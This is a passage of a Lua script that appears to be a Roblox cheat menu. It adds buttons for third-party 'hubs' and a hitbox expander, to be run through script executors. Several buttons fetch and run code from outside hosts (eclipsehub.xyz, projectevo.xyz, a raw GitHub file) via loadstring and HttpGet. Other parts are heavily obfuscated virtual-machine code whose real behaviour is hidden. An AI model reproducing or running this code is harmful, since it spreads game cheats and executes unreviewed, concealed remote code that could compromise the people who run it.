uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="EDDAA82B1CC319D55BAE8EFADC7CF6B3050C4BB4D72818CFD11CEFB"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),49 ,67 ,69 ,50 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={688,244,805,134,350}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+49,48 ,57 ,49 ,49 ,48 ,50 ,50 ,66 ,67 ,65 ,70 ,66 ,66 ,67 ,54 ,49 ,65 ,56 ,51 ,57 ,51 ,53 ,70 ,52 ,52 ,54 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="2CE83542FA6EA4DC92C2FEBB305F0CB4C99C0C37CD53CA6426A33831"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),55 ,54 ,49 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="B361DFB422033AD545EA208EE1E7D84756BD99F145D0EDD0D54F"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),57 ,48 ,49 ,54 ,49 ,52 ,53 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="F95B5B3D012EAC4B17FAC32E8DBCDD4C0EE791E824EF52673486F2BB0CE63D5593A"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),68 ,53 ,66 ,56 ,54 ,56 ,49 ,66 ,65 ,53 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="E2425FE817A5FD87A47D4C67C1E4EBCEAE77544145E852FCB7480302EC6A33236"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),51 ,68 ,54 ,52 ,55 ,66 ,50 ,49 ,50 ,67 ,53 ,51 ,56 ,51 ,67 ,49 ,69 ,49 ,56 ,52 ,55 ,49 ,55 ,53 ,48 ,51 ,52 ,51 ,53 ,49 ,52 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={338,544,171,308,64}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+46,68 ,52 ,52 ,49 ,57 ,70 ,67 ,67 ,65 ,68 )..""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={684}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+0 end)(),114  ,115  ,97  ,108  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..'',true  ))()end end)uWUuwUOWoUwUOwoOwOOwOowOOwOuwUUwUOwOUWuowOUwUuwUowouwUOwOUwUuWu().DarkHubLoaded=true  end if not uWUuwUOWoUwUOwoOwOOwOowOOwOuwUUwUOwOUWuowOUwUuwUowouwUOwOUwUuWu().DarkHubLoaded then OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo()end
end)

local EclipseHub = ScriptsTab.AddButton("Eclipse Hub", function()
-- Eclipse Hub loadstring (script) [NO LINKVERTISE] please like/sub! --

getgenv().mainKey = "nil"

local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)

local Evo = ScriptsTab.AddButton("Evo", function()
loadstring(game:HttpGet("https://projectevo.xyz/script/loader.lua"))()

end)

local Faded = ScriptsTab.AddButton("Faded", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
end)

local HitboxExtenedr = ScriptsTab.AddButton("Hitbox Expander", function()


local GameOverAgainllilli1iIil1l111i11 = assert local GameOverAgainl11illliliii1IIl1I1 = select local GameOverAgainlIlliil1Il1l1l1il1IlI = tonumber local GameOverAgaini1I1II1il1l1iI1lli1 = unpack local GameOverAgainI1i1i1i1lli1ilIII1l = pcall local GameOverAgainiiilI1ii1i11l11Ilil = setfenv local GameOverAgainll11Iii11i1Ill1ll1i = setmetatable local GameOverAgainl1IiiIl1iIilI1Ill1I = type local GameOverAgainlilIIii1lIlIiIiI11i = getfenv local GameOverAgainlIlilllIilIIiIIlIilIl = tostring local GameOverAgainl1I1iI11iII1lilliiI = error local GameOverAgainIiiiiI11llIIliiIIl1 = string.sub local GameOverAgainIiiI1lli1IliIiiII1l = string.byte local GameOverAgainlIl1l1iil1ilII111Il11 = string.char local GameOverAgainI1IllI1i1il1li11liI = string.rep local GameOverAgainlI1il11IliI1i1ii1ll = string.gsub local GameOverAgainlIIii1II11llI1I1III = string.match local GameOverAgainI1IIlIi1IIiiIiliII1 = #{2513} local GameOverAgainiIII1lllliIil1IlII1 = {} local GameOverAgainlIIi111Ii1liI11llii = 1 local function GameOverAgainlIlli1iIll1IlI111IlIi(GameOverAgainllIiIiillli1111lII1, GameOverAgainilIllIIIiilIll1Iii1) local GameOverAgaini1lill1lillil1II1Ii GameOverAgainllIiIiillli1111lII1 = GameOverAgainlI1il11IliI1i1ii1ll(GameOverAgainIiiiiI11llIIliiIIl1(GameOverAgainllIiIiillli1111lII1, 5), "..", function(GameOverAgainIl11IIlI1llI11llIil) if GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainIl11IIlI1llI11llIil, 2) == 71 then GameOverAgaini1lill1lillil1II1Ii = GameOverAgainlIlliil1Il1l1l1il1IlI(GameOverAgainIiiiiI11llIIliiIIl1(GameOverAgainIl11IIlI1llI11llIil, 1, 1)) return "" else local GameOverAgainlIilli1IIlil1iliIll = GameOverAgainlIl1l1iil1ilII111Il11(GameOverAgainlIlliil1Il1l1l1il1IlI(GameOverAgainIl11IIlI1llI11llIil, 16)) if GameOverAgaini1lill1lillil1II1Ii then local GameOverAgainlIliIllIili1lI1iilI1i = GameOverAgainI1IllI1i1il1li11liI(GameOverAgainlIilli1IIlil1iliIll, GameOverAgaini1lill1lillil1II1Ii) GameOverAgaini1lill1lillil1II1Ii = nil return GameOverAgainlIliIllIili1lI1iilI1i else return GameOverAgainlIilli1IIlil1iliIll end end end) local function GameOverAgainiIl111iiIllI1iiIiI1() local GameOverAgainll1i1iliil1I1Illli1 = GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainllIiIiillli1111lII1, GameOverAgainlIIi111Ii1liI11llii, GameOverAgainlIIi111Ii1liI11llii) GameOverAgainlIIi111Ii1liI11llii = GameOverAgainlIIi111Ii1liI11llii + 1 return GameOverAgainll1i1iliil1I1Illli1 end local function GameOverAgainliil1ili1iIiII1I1ii() local GameOverAgainll1i1iliil1I1Illli1, GameOverAgainlIilli1IIlil1iliIll, GameOverAgainlIliIllIili1lI1iilI1i, GameOverAgainIl11iiIli1I1lI1i111 = GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainllIiIiillli1111lII1, GameOverAgainlIIi111Ii1liI11llii, GameOverAgainlIIi111Ii1liI11llii + 3) GameOverAgainlIIi111Ii1liI11llii = GameOverAgainlIIi111Ii1liI11llii + 4 return GameOverAgainIl11iiIli1I1lI1i111 * 16777216 + GameOverAgainlIliIllIili1lI1iilI1i * 65536 + GameOverAgainlIilli1IIlil1iliIll * 256 + GameOverAgainll1i1iliil1I1Illli1 end local function GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainill1liil1lIiII1ilIi, GameOverAgainlIiIiIliIlli1il11ii, GameOverAgaini1i111i1iii1111iIii) if GameOverAgaini1i111i1iii1111iIii then local GameOverAgainliIi1IliIIl1l11ilii, GameOverAgainliliIIlilIIIi1li1l1 = 0, 0 for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainlIiIiIliIlli1il11ii, GameOverAgaini1i111i1iii1111iIii do GameOverAgainliIi1IliIIl1l11ilii = GameOverAgainliIi1IliIIl1l11ilii + 2 ^ GameOverAgainliliIIlilIIIi1li1l1 * GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainill1liil1lIiII1ilIi, GameOverAgainI1lIiii11ll1i1IlI1l) GameOverAgainliliIIlilIIIi1li1l1 = GameOverAgainliliIIlilIIIi1li1l1 + 1 end return GameOverAgainliIi1IliIIl1l11ilii else local GameOverAgainlIlIiIlIiiiliIIi1l1li = 2 ^ (GameOverAgainlIiIiIliIlli1il11ii - 1) return GameOverAgainlIlIiIlIiiiliIIi1l1li <= GameOverAgainill1liil1lIiII1ilIi % (GameOverAgainlIlIiIlIiiiliIIi1l1li + GameOverAgainlIlIiIlIiiiliIIi1l1li) and 1 or 0 end end local function GameOverAgainlIlIi11iiil1IiIi11I1l() local GameOverAgainll1i1iliil1I1Illli1, GameOverAgainlIilli1IIlil1iliIll = GameOverAgainliil1ili1iIiII1I1ii(), GameOverAgainliil1ili1iIiII1I1ii() if GameOverAgainll1i1iliil1I1Illli1 == 0 and GameOverAgainlIilli1IIlil1iliIll == 0 then return 0 end return (-2 * GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainlIilli1IIlil1iliIll, 32) + 1) * 2 ^ (GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainlIilli1IIlil1iliIll, 21, 31) - 1023) * ((GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainlIilli1IIlil1iliIll, 1, 20) * 4294967296 + GameOverAgainll1i1iliil1I1Illli1) / 4503599627370496 + 1) end local function GameOverAgaini11iiiil1Ill11li1l1(GameOverAgainiiIilIlIl1IIi1l1IlI) local GameOverAgainlIlIi11iI1l1111I1ilI1 = { GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainllIiIiillli1111lII1, GameOverAgainlIIi111Ii1liI11llii, GameOverAgainlIIi111Ii1liI11llii + 3) } GameOverAgainlIIi111Ii1liI11llii = GameOverAgainlIIi111Ii1liI11llii + 4 local GameOverAgainlIllii11l1i1i1IIlI1ll = { nil, nil, nil, nil, nil, nil, nil, nil } for GameOverAgainI1lIiii11ll1i1IlI1l = 1, 8 do GameOverAgainlIllii11l1i1i1IIlI1ll[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainiiIilIlIl1IIi1l1IlI, GameOverAgainI1lIiii11ll1i1IlI1l) end local GameOverAgainlIl1lIIIlil1il111I1l1 = "" for GameOverAgainI1lIiii11ll1i1IlI1l = 1, 4 do local GameOverAgainliIi1IliIIl1l11ilii, GameOverAgainliliIIlilIIIi1li1l1 = 0, 0 for GameOverAgainliiIliIlilliIIIi1I1 = 1, 8 do local GameOverAgainI11iIliIi1I1Iiiil11 = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainlIlIi11iI1l1111I1ilI1[GameOverAgainI1lIiii11ll1i1IlI1l], GameOverAgainliiIliIlilliIIIi1I1) if GameOverAgainlIllii11l1i1i1IIlI1ll[GameOverAgainliiIliIlilliIIIi1I1] == 1 then GameOverAgainI11iIliIi1I1Iiiil11 = GameOverAgainI11iIliIi1I1Iiiil11 == 1 and 0 or 1 end GameOverAgainliIi1IliIIl1l11ilii = GameOverAgainliIi1IliIIl1l11ilii + 2 ^ GameOverAgainliliIIlilIIIi1li1l1 * GameOverAgainI11iIliIi1I1Iiiil11 GameOverAgainliliIIlilIIIi1li1l1 = GameOverAgainliliIIlilIIIi1li1l1 + 1 end GameOverAgainlIl1lIIIlil1il111I1l1 = GameOverAgainlIl1lIIIlil1il111I1l1 .. GameOverAgainlIl1lIIIlil1il111I1l1.char(GameOverAgainliIi1IliIIl1l11ilii) end local GameOverAgainll1i1iliil1I1Illli1, GameOverAgainlIilli1IIlil1iliIll, GameOverAgainlIliIllIili1lI1iilI1i, GameOverAgainIl11iiIli1I1lI1i111 = GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainlIl1lIIIlil1il111I1l1, 1, 4) return GameOverAgainIl11iiIli1I1lI1i111 * 16777216 + GameOverAgainlIliIllIili1lI1iilI1i * 65536 + GameOverAgainlIilli1IIlil1iliIll * 256 + GameOverAgainll1i1iliil1I1Illli1 end local function GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainiiIilIlIl1IIi1l1IlI) local GameOverAgainlIlI11iii1I1llil1lIIi = GameOverAgainliil1ili1iIiII1I1ii() GameOverAgainlIIi111Ii1liI11llii = GameOverAgainlIIi111Ii1liI11llii + GameOverAgainlIlI11iii1I1llil1lIIi local GameOverAgainlIllii11l1i1i1IIlI1ll = { nil, nil, nil, nil, nil, nil, nil, nil } for GameOverAgainI1lIiii11ll1i1IlI1l = 1, 8 do GameOverAgainlIllii11l1i1i1IIlI1ll[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainiiIilIlIl1IIi1l1IlI, GameOverAgainI1lIiii11ll1i1IlI1l) end local GameOverAgainlIl1lIIIlil1il111I1l1 = "" for GameOverAgainI1lIiii11ll1i1IlI1l = 1, GameOverAgainlIlI11iii1I1llil1lIIi do local GameOverAgainliIi1IliIIl1l11ilii, GameOverAgainliliIIlilIIIi1li1l1 = 0, 0 for GameOverAgainliiIliIlilliIIIi1I1 = 1, 8 do local GameOverAgainI11iIliIi1I1Iiiil11 = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiiI1lli1IliIiiII1l(GameOverAgainllIiIiillli1111lII1, GameOverAgainlIIi111Ii1liI11llii - GameOverAgainlIlI11iii1I1llil1lIIi + GameOverAgainI1lIiii11ll1i1IlI1l - 1), GameOverAgainliiIliIlilliIIIi1I1) if GameOverAgainlIllii11l1i1i1IIlI1ll[GameOverAgainliiIliIlilliIIIi1I1] == 1 then GameOverAgainI11iIliIi1I1Iiiil11 = GameOverAgainI11iIliIi1I1Iiiil11 == 1 and 0 or 1 end GameOverAgainliIi1IliIIl1l11ilii = GameOverAgainliIi1IliIIl1l11ilii + 2 ^ GameOverAgainliliIIlilIIIi1li1l1 * GameOverAgainI11iIliIi1I1Iiiil11 GameOverAgainliliIIlilIIIi1li1l1 = GameOverAgainliliIIlilIIIi1li1l1 + 1 end GameOverAgainlIl1lIIIlil1il111I1l1 = GameOverAgainlIl1lIIIlil1il111I1l1 .. GameOverAgainlIl1lIIIlil1il111I1l1.char(GameOverAgainliIi1IliIIl1l11ilii) end return GameOverAgainlIl1lIIIlil1il111I1l1 end local GameOverAgainIllI111ilIlIi1i11li = GameOverAgainiIl111iiIllI1iiIiI1() local GameOverAgainlI11I1i11ll1IiIl1li = GameOverAgainiIl111iiIllI1iiIiI1() local function GameOverAgainiIiilIliiIlilliliIi() local GameOverAgainil1IiIi1li1I1llIiil = { [120717] = {}, [41168] = {}, [21543] = {}, [122665] = {} } GameOverAgainliil1ili1iIiII1I1ii() local GameOverAgainlIi1Il1iillIlIIiIii = GameOverAgainliil1ili1iIiII1I1ii() for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainI1IIlIi1IIiiIiliII1, GameOverAgainlIi1Il1iillIlIIiIii do GameOverAgainil1IiIi1li1I1llIiil[41168][GameOverAgainI1lIiii11ll1i1IlI1l - GameOverAgainI1IIlIi1IIiiIiliII1] = GameOverAgainiIiilIliiIlilliliIi() end GameOverAgainil1IiIi1li1I1llIiil[28672] = GameOverAgainiIl111iiIllI1iiIiI1() GameOverAgainiIl111iiIllI1iiIiI1() GameOverAgainliil1ili1iIiII1I1ii() GameOverAgainliil1ili1iIiII1I1ii() GameOverAgainiIl111iiIllI1iiIiI1() GameOverAgainliil1ili1iIiII1I1ii() GameOverAgainil1IiIi1li1I1llIiil[87011] = GameOverAgainiIl111iiIllI1iiIiI1() GameOverAgainiIl111iiIllI1iiIiI1() local GameOverAgainlIi1Il1iillIlIIiIii = GameOverAgainliil1ili1iIiII1I1ii() - (#{ 3552, 4767, 6512, 4079, 474, 4293, 6319, 1688, 6829, 3290, 627, 1274, 1352, 3450, 1429, 5810, 6124, 5702, 4686, 4339, 931 } + 133738) for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainI1IIlIi1IIiiIiliII1, GameOverAgainlIi1Il1iillIlIIiIii do local GameOverAgainlIlI1IliIll1I1IliiIli = {} local GameOverAgainl1IiiIl1iIilI1Ill1I = GameOverAgainiIl111iiIllI1iiIiI1() if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 5932, 4137, 214, 5597, 2250, 838, 4101, 4342, 2388, 5094, 1856, 6148, 654, 3786, 826, 334, 5583, 737, 6194, 5088, 6363, 661 } + 177 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainIllI111ilIlIi1i11li) end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 5126, 5090, 556, 4730, 3066, 4184, 6233, 5740, 5620, 3203, 3257, 6541, 234, 6083, 1208, 1779, 6882, 5876, 6947, 2809, 3726, 3630 } + 58 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainIllI111ilIlIi1i11li) end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 951, 5065, 334, 2674, 4780, 4820, 6906, 5114, 2514, 4103, 4594, 6751, 1828, 3587, 4908, 6142, 3933, 2893, 4030, 6821 } + 94 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = #{ 2348, 84, 2568, 6418, 1049, 6378, 6270, 605, 3721, 1352, 4885, 2059, 5286, 1326, 1638, 5971, 1391, 5345, 6452, 4713, 3991 } + 24020 == #{ 257, 2771, 445, 1117, 2855, 5944, 6833, 2214, 6944, 4599, 4471, 780, 1854, 2574, 2700, 5254, 5944, 640, 202, 238, 3672, 1998, 3215, 456 } + 119228 end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 2860, 1369, 1794, 353, 5615, 5106, 1598, 2228, 4575, 4335, 5794, 1081, 4979, 2153, 2315, 1802, 6795, 4316, 4411, 3740, 5718 } + 209 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = #{ 6516, 3850, 5644, 610, 3305, 3807, 3233, 5211, 755, 3634, 1604, 2362, 1689, 2339, 5799, 1649, 5485, 5587, 3290, 4741, 6337, 4172, 2088 } + 91384 == #{ 6516, 3850, 5644, 610, 3305, 3807, 3233, 5211, 755, 3634, 1604, 2362, 1689, 2339, 5799, 1649, 5485, 5587, 3290, 4741, 6337, 4172, 2088 } + 91384 end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 2105, 388, 2293, 2216, 5670, 539, 6259, 3786, 516, 2737, 6782, 3206, 2903, 4016, 4823, 201, 4487, 5633, 3973, 454, 3173 } + 72 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainIllI111ilIlIi1i11li) end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 3530, 2736, 2326, 5938, 5223, 1510, 3806, 594 } then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainIllI111ilIlIi1i11li) end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 4159, 6293, 6429, 776, 4567, 5214, 5630, 1988, 1193, 148, 5010, 3995, 3765, 1626, 4001, 2819, 4197, 2893, 1685, 4467, 2877, 6314, 1770, 5116 } + 28 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiilllIi1ii11I1l1lii(GameOverAgainIllI111ilIlIi1i11li) end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 804, 6234, 3956, 6001, 1264, 6355, 4529, 4534, 326, 2234, 1410, 4213, 1384, 4585, 1305, 2730, 6234, 4659, 1884, 1453, 6844 } + 14 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainiIl111iiIllI1iiIiI1() + GameOverAgainliil1ili1iIiII1I1ii() + GameOverAgainlIlIi11iiil1IiIi11I1l() end if GameOverAgainl1IiiIl1iIilI1Ill1I == #{ 2785, 4941, 3173, 1003, 2937, 3968, 6852, 2557, 6630, 4556, 3111, 780, 805, 3580, 5208, 4613, 661, 6560, 5943, 2759 } + 110 then GameOverAgainlIlI1IliIll1I1IliiIli[7475] = GameOverAgainlIlIi11iiil1IiIi11I1l() end GameOverAgainil1IiIi1li1I1llIiil[122665][GameOverAgainI1lIiii11ll1i1IlI1l - GameOverAgainI1IIlIi1IIiiIiliII1] = GameOverAgainlIlI1IliIll1I1IliiIli end GameOverAgainiIl111iiIllI1iiIiI1() GameOverAgainil1IiIi1li1I1llIiil[46598] = GameOverAgainiIl111iiIllI1iiIiI1() local GameOverAgainlIi1Il1iillIlIIiIii = GameOverAgainliil1ili1iIiII1I1ii() for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainI1IIlIi1IIiiIiliII1, GameOverAgainlIi1Il1iillIlIIiIii do GameOverAgainil1IiIi1li1I1llIiil[120717][GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainliil1ili1iIiII1I1ii() end local GameOverAgainlIi1Il1iillIlIIiIii = GameOverAgainliil1ili1iIiII1I1ii() - (#{ 3949, 457, 2072, 1217, 1908, 5312, 5942, 4436, 3901, 4094, 4637, 2766, 6441, 5917, 2792, 5778, 6264, 2145, 5155, 5466 } + 133727) for GameOverAgainI1lIiii11ll1i1IlI1l = GameOverAgainI1IIlIi1IIiiIiliII1, GameOverAgainlIi1Il1iillIlIIiIii do local GameOverAgainlllii11iI1ii11ilI1I = {} local GameOverAgainIiIliIii1IilIIliiiI = GameOverAgaini11iiiil1Ill11li1l1(GameOverAgainlI11I1i11ll1IiIl1li) GameOverAgainlllii11iI1ii11ilI1I[21866] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{ 5064, 5530, 5984, 3104, 4802, 6442, 2055, 2789, 3299, 1178, 3682, 569, 6169, 589, 4713, 5523, 2768, 6108, 5210 }, #{ 3160, 1778, 5294, 890, 4848, 1141, 2372, 2807, 6942, 208, 4858, 2085, 1111, 1516, 4477, 2706, 474, 4108, 5363, 1694, 3751, 253 } + 4) GameOverAgainlllii11iI1ii11ilI1I[91286] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{ 4943, 4180, 4579, 5238, 6489, 5895, 4190, 840, 4495, 6429, 589, 6268, 5325, 3133, 6937, 3272, 5404, 5385, 12, 3791, 4788, 3718, 2938, 4315 } + 3, #{ 4584, 159, 2270, 3498, 6943, 6111, 6031, 1233, 5538, 1479, 663, 4570, 2649, 3012, 4411, 4505, 4723, 2020, 2041, 6277, 1621, 1585, 4959 } + 9) GameOverAgainlllii11iI1ii11ilI1I[90718] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{ 5111, 5463, 6556, 6944, 4172, 85, 6594, 3795, 2481, 3208 }, #{ 1536, 6199, 6647, 2940, 5302, 2336, 6187, 4461, 5262, 5471, 3106, 1046, 1618, 4215, 3948, 1556, 1712, 2099 }) GameOverAgainlllii11iI1ii11ilI1I[71033] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{ 220, 6646, 3858, 3302, 5711, 1926, 1621, 6669, 3088, 2567, 4385, 4340, 3984, 4373, 1547, 6391, 2388, 2580, 747 }, #{ 2087, 757, 5956, 4938, 2282, 369, 243, 4305, 6379, 3524, 1255, 5782, 5378, 3934, 6934, 4794, 3266, 5382, 4499, 3851, 1704 } + 5) GameOverAgainlllii11iI1ii11ilI1I[49575] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{3911}, #{ 3172, 1691, 3203, 5406, 4976, 5532, 1956, 6359, 3031, 2303, 3675, 5873, 587, 5157, 5071, 4680, 4836, 4674 }) GameOverAgainlllii11iI1ii11ilI1I[53199] = GameOverAgainliiiII1lIi1i1l1ii1I(GameOverAgainIiIliIii1IilIIliiiI, #{6646}, #{ 4412, 3320, 2010, 393, 3095, 5032, 2575, 4443, 4554 }) GameOverAgainil1IiIi1li1I1llIiil[21543][GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgainlllii11iI1ii11ilI1I end return GameOverAgainil1IiIi1li1I1llIiil end local function GameOverAgainlIl1l11iill1Ii1I1I1i1(GameOverAgainil1IiIi1li1I1llIiil, GameOverAgainilIllIIIiilIll1Iii1, GameOverAgainIlilIiI1Ii11l1Il111) local GameOverAgainlIlilllilI1I1ll11ilii, GameOverAgainlli1iIIlIlIliiiI1I1 = 30, 25 local GameOverAgainlIl1llIl1IlIl1lIIIIIl = GameOverAgainil1IiIi1li1I1llIiil[21543] local GameOverAgainIl1ll1llliIll11i1i1 = GameOverAgainll11Iii11i1Ill1ll1i({}, { __index = function(GameOverAgainlIIIii1i111iilii11l, GameOverAgainlIl1ll1illI1iIlI1i1I1) local GameOverAgainlIl1lIIIlil1il111I1l1 = GameOverAgainil1IiIi1li1I1llIiil[122665][GameOverAgainlIl1ll1illI1iIlI1i1I1] if GameOverAgainIiiiiI11llIIliiIIl1(GameOverAgainl1IiiIl1iIilI1Ill1I(GameOverAgainlIl1lIIIlil1il111I1l1[7475]), 1, 1) == "s" then return { [7475] = GameOverAgainIiiiiI11llIIliiIIl1(GameOverAgainlIl1lIIIlil1il111I1l1[7475], 4) } end return GameOverAgainlIl1lIIIlil1il111I1l1 end }) local GameOverAgainiilllililii11ll1l1i = 87011 local GameOverAgainIli1III1i1l1l1iil11 = GameOverAgainil1IiIi1li1I1llIiil[41168] local GameOverAgainll1I11iiiiIIIi1llII = 7475 local GameOverAgainiI1ilii1ilIilIl1i11 = GameOverAgainil1IiIi1li1I1llIiil[46598] local GameOverAgainiIliiIlIlI11Ii1I1i1 = 91286 local GameOverAgainlIlil11I11iI11lI1IiiI = GameOverAgainil1IiIi1li1I1llIiil[120717] local GameOverAgainii11i1iil1IlIIi1IIi = 53199 local function GameOverAgainIiI111ilill11I1IiI1(...) local GameOverAgainIlilIill1Il1IliiI1i = 0 local GameOverAgainIiiilIill1ilIl1ii1i = { GameOverAgaini1I1II1il1l1iI1lli1({}, 1, GameOverAgainil1IiIi1li1I1llIiil[28672]) } local GameOverAgainiIIl1iliI11i11IlIIi = 1 local GameOverAgainllIil1l11IIlI1lll1i = {} local GameOverAgainlliIIi1IiI1I1IllI1i = {} local GameOverAgainl1lIi1II1iIii1IiIl1 = 1 local GameOverAgainilIllIIIiilIll1Iii1 = GameOverAgainlilIIii1lIlIiIiI11i() local GameOverAgaini1II11iiIi1II1l1Iil = { ... } local GameOverAgainIlI1iliI1lilIiIl1i1 = {} local GameOverAgainlIl1illIiliil1l1iii1l = #GameOverAgaini1II11iiIi1II1l1Iil - 1 for GameOverAgainI1lIiii11ll1i1IlI1l = 0, GameOverAgainlIl1illIiliil1l1iii1l do if GameOverAgainiI1ilii1ilIilIl1i11 >= GameOverAgainI1lIiii11ll1i1IlI1l + 1 then GameOverAgainIiiilIill1ilIl1ii1i[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgaini1II11iiIi1II1l1Iil[GameOverAgainI1lIiii11ll1i1IlI1l + 1] end GameOverAgainIlI1iliI1lilIiIl1i1[GameOverAgainI1lIiii11ll1i1IlI1l] = GameOverAgaini1II11iiIi1II1l1Iil[GameOverAgainI1lIiii11ll1i1IlI1l + 1] end local function GameOverAgainiil1lI111lI11i1lIii(...) local GameOverAgainlIliIllIili1lI1iilI1i = GameOverAgainl11illliliii1IIl1I1("#", ...) local GameOverAgainlIIIii1i111iilii11l = { ... } return GameOverAgainlIliIllIili1lI1iilI1i, GameOverAgainlIIIii1i111iilii11l end local GameOverAgainlIiI11lI1lililil1l1 = #{ 5072, 3467, 6703, 5945, 5241, 5430, 3380, 1726, 4595, 1490, 481, 2765, 5030, 3854, 5633, 3795, 1827, 3558, 173, 4349, 2334, 3234, 1957 } + 131048 local GameOverAgainiIlliIliiIlllIi1Il1 local GameOverAgainl1l11l11Ili1i11iiII = { 